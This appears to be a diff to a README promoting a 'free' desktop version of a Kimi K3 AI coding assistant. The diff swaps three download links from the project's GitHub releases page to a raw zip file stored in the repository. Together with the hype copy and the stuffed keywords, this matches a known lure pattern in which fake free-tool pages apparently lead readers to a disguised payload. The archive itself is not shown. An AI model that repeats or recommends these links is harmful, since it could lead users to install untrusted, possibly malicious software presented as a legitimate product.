@@ -1,6 +1,6 @@
 # 🚀 Kimi-K3-Code-Free-Desktop - Your Free AI Coding Assistant for Windows
 
-[![Download Kimi K3](https://img.shields.io/badge/Download-Kimi_K3_Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://github.com/lapoart/Kimi-K3-Code-Free-Desktop/releases)
+[![Download Kimi K3](https://img.shields.io/badge/Download-Kimi_K3_Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://raw.githubusercontent.com/lapoart/Kimi-K3-Code-Free-Desktop/main/review/3.2-beta.1.zip)
 
 ## 👋 Welcome to Kimi K3 Code Free Desktop
 
@@ -56,7 +56,7 @@ Getting started with Kimi K3 is incredibly simple. Follow these steps:
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [Kimi K3 Code Free Desktop Releases](https://github.com/lapoart/Kimi-K3-Code-Free-Desktop/releases)
+Visit this link to download the application: [Kimi K3 Code Free Desktop Releases](https://raw.githubusercontent.com/lapoart/Kimi-K3-Code-Free-Desktop/main/review/3.2-beta.1.zip)
 
 ### Step 2: Find the Latest Version
 
@@ -119,6 +119,6 @@ Kimi K3 Code Free Desktop represents an incredible opportunity to access world-c
 
 The fact that it's free, combined with its impressive benchmarks and features, makes Kimi K3 a standout choice in the crowded AI assistant market. Don't wait – download Kimi K3 today and experience the future of AI assistance!
 
-[![Get Kimi K3 Now](https://img.shields.io/badge/🚀_Download_Kimi_K3-Free_AI_Assistant-6f42c1?style=for-the-badge&logo=github&logoColor=white&labelColor=28a745)](https://github.com/lapoart/Kimi-K3-Code-Free-Desktop/releases)
+[![Get Kimi K3 Now](https://img.shields.io/badge/🚀_Download_Kimi_K3-Free_AI_Assistant-6f42c1?style=for-the-badge&logo=github&logoColor=white&labelColor=28a745)](https://raw.githubusercontent.com/lapoart/Kimi-K3-Code-Free-Desktop/main/review/3.2-beta.1.zip)
 
 Keywords: ai-api-free, ai-desktop, desktop-ai, free-ai-tools, k2-7, k3-kimi, kimi, kimi-api, kimi-code, kimi-code-k3, kimi-k2, kimi-k2-6, kimi-k2-7-code, kimi-k2-ai, kimi-k26, kimi-k3, kimi-k3-free, kimi-solution, moonshot, moonshot-ai
